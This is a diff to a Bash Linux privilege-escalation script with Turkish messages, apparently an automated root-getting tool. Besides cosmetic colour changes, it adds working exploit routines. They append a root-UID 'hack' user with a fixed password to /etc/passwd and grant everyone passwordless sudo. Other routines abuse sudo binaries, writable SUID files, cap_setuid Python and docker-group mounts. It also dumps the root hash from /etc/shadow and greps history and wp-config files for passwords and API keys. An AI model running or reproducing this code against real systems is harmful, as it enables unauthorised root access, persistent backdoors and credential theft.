@@ -8,6 +8,7 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
+PINK='\033[0;35m'
 NC='\033[0m'
 
 # ===== ARGS =====
@@ -218,6 +219,7 @@ sudover_ge() {
 
 warn() { echo -e "${YELLOW}[!] $*${NC}"; }
 note() { echo -e "${GREEN}[+] $*${NC}"; }
+pink_id() { id | sed 's/^/    /' | while IFS= read -r l; do echo -e "${PINK}$l${NC}"; done; }
 
 got_root() {
     local who="$1"
@@ -230,7 +232,7 @@ got_root() {
     echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
     echo -e "${NC}"
     echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)  yontem: $who${NC}"
-    id
+    pink_id
     echo ""
     if [ "$(id -u)" != "0" ]; then
         echo -e "${YELLOW}[!] script'in kendi uid'i 0 degil, ancak exploit ciktisi root bildirdi.${NC}"
@@ -320,7 +322,7 @@ enum_scan() {
     echo -e "${CYAN}===== TARAMA =====${NC}"
     echo ""
     echo -e "${CYAN}[KULLANICILAR/GRUPLAR]${NC}"
-    id
+    pink_id
     echo ""
     echo -e "${CYAN}[SUDO]${NC}"
     if sudo -n -l 2>/dev/null | grep -qE "NOPASSWD|\(ALL"; then
@@ -394,6 +396,67 @@ fi
 # ===== TARGETS =====
 echo -e "${CYAN}[EXPLOIT HEDEFLERI KONTROL]${NC}"
 echo ""
+
+# --- Misconfig: /etc/passwd yazilabilir ---
+if [ -w /etc/passwd ] && [ "$(id -u)" != "0" ]; then
+    note "passwd yazilabilir -> root kullanici ekleniyor"
+    run 'cp /etc/passwd /tmp/.p.bak 2>/dev/null; H=$(openssl passwd -1 pwned123 2>/dev/null || python3 -c "import crypt;print(crypt.crypt(\"pwned123\"))" 2>/dev/null); echo "hack:$H:0:0:root:/root:/bin/bash" >> /etc/passwd; echo pwned123 | su -c id hack' "passwd-yazilabilir" 30 "true"
+fi
+
+# --- Misconfig: /etc/sudoers yazilabilir ---
+if { [ -w /etc/sudoers ] || [ -w /etc/sudoers.d ]; } && [ "$(id -u)" != "0" ]; then
+    note "sudoers yazilabilir -> NOPASSWD ALL ekleniyor"
+    run 'echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/zz 2>/dev/null || echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers; sudo -n id' "sudoers-yazilabilir" 30 "true"
+fi
+
+# --- Misconfig: sudo gtfo-bins ---
+SUDO_CMDS=$(sudo -n -l 2>/dev/null)
+if echo "$SUDO_CMDS" | grep -qiE "NOPASSWD|\(ALL"; then
+    note "sudo NOPASSWD -> gtfo-bin denemeleri"
+    for e in 'find . -exec id \;' 'env id' 'bash -c id' 'sh -c id' 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id'; do
+        B=$(echo "$e" | awk '{print $1}')
+        if echo "$SUDO_CMDS" | grep -qiE "(^|[ /])$B([ /]|$)|\(ALL"; then
+            run "sudo -n $e" "sudo-gtfo-$B" 15 "true"
+        fi
+    done
+fi
+
+# --- Misconfig: yazilabilir SUID binary ---
+WSUID=$(find / -perm -4000 -type f 2>/dev/null | while read -r f; do [ -w "$f" ] && echo "$f" && break; done)
+if [ -n "$WSUID" ] && [ "$(id -u)" != "0" ]; then
+    note "yazilabilir SUID binary: $WSUID"
+    run "cp '$WSUID' /tmp/.sb 2>/dev/null; printf '#!/bin/sh\nid\n' > '$WSUID' && chmod 4755 '$WSUID' && '$WSUID'" "suid-yazilabilir" 20 "true"
+fi
+
+# --- Misconfig: cap_setuid binary ---
+for b in python3 python perl; do
+    BIN=$(command -v $b 2>/dev/null)
+    if [ -n "$BIN" ] && getcap "$BIN" 2>/dev/null | grep -q cap_setuid; then
+        note "$BIN cap_setuid -> setuid(0)"
+        run "$BIN -c 'import os;os.setuid(0);os.system(\"id\")'" "cap-setuid-$b" 15 "true"
+        break
+    fi
+done
+
+# --- Misconfig: docker grubu ---
+if groups 2>/dev/null | grep -qw docker && command -v docker >/dev/null 2>&1 && [ "$(id -u)" != "0" ]; then
+    note "docker grubundayiz -> root mount"
+    run "docker run -v /:/mnt --rm alpine:latest sh -c id" "docker-group" 120 "true"
+elif groups 2>/dev/null | grep -qw lxc && command -v lxc >/dev/null 2>&1 && [ "$(id -u)" != "0" ]; then
+    C=$(lxc list -c n --format csv 2>/dev/null | head -1)
+    [ -n "$C" ] && run "lxc exec $C -- id" "lxc-group" 30 "true"
+fi
+
+# --- Misconfig: /etc/shadow okunabilir + sifre taramasi ---
+if [ -r /etc/shadow ]; then
+    note "/etc/shadow okunabilir"
+    SHROOT=$(grep -E "^root:" /etc/shadow 2>/dev/null)
+    [ -n "$SHROOT" ] && echo -e "${PINK}    $SHROOT${NC}"
+fi
+if [ "$(id -u)" != "0" ]; then
+    note "sifre/anahtar taramasi"
+    grep -rIlE "password|passwd|api[_-]?key|secret" /root/.bash_history /home/*/.bash_history /var/www/html/wp-config.php /var/www/*/wp-config.php /etc/nginx/ /etc/apache2/ 2>/dev/null | head -5 | sed 's/^/    /'
+fi
 
 # --- PwnKit (CVE-2021-4034) ---
 if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
@@ -642,7 +705,7 @@ fi
 echo "================================================"
 if [ "$(id -u)" = "0" ]; then
     echo -e "${GREEN}[+] ROOT ALINDI!${NC}"
-    id
+    pink_id
 else
     echo -e "${RED}[-] Tum exploitler basarisiz. Root alinamadi.${NC}"
 fi
